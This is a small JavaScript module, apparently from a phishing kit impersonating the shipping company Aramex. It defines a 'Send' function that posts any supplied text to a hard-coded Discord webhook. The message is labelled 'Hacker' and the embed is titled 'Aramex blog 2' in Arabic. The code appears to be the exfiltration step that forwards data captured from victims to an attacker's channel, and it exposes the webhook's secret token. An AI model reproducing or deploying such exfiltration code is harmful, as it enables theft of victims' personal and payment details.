import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325787923286589454/_atDYOifSVrm8kgEpbJ9BWF6ITeXgutTu8MPFZmtcFjhJeZVAjJkbG42L_-SvpIm6cB7",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
